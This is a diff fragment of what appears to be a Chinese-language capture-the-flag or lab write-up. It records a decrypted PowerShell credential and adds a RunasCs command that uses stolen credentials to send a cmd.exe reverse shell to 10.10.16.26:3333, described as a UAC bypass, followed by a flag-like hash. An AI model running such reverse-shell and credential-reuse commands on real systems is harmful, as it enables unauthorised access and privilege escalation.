@@ -572,6 +572,12 @@ echo $Credential.GetNetworkCredential().password
 
 
 使用powershell解密得到密码`f8gQ8fynP44ek1m3`
+使用runascs可以绕过uac
+
+`.\RunasCs.exe alaading alaading_pass cmd.exe -r 10.10.16.26:3333`
+
+5f4904d57c58149a29d31ca4d073387c
+
 ### Manager
 #### user
 - nmap
